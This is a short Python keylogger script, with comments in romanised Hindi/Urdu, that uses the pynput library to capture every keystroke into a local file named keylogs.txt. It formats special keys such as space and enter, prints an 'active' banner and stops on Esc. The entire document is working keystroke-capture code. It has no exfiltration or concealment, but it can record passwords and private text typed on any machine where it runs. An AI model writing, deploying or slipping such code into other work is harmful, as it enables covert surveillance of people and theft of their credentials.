from pynput.keyboard import Key, Listener

# Jahan data save hoga
log_file = "keylogs.txt"

def on_press(key):
    try:
        # Normal keys (a, b, c, 1, 2) ko file mein likhna
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (Space, Enter, Shift) ke liye format
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Agar 'Esc' dabayein to program band ho jaye
    if key == Key.esc:
        return False

print("--- Keylogger Active... (Press 'Esc' to Stop) ---")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
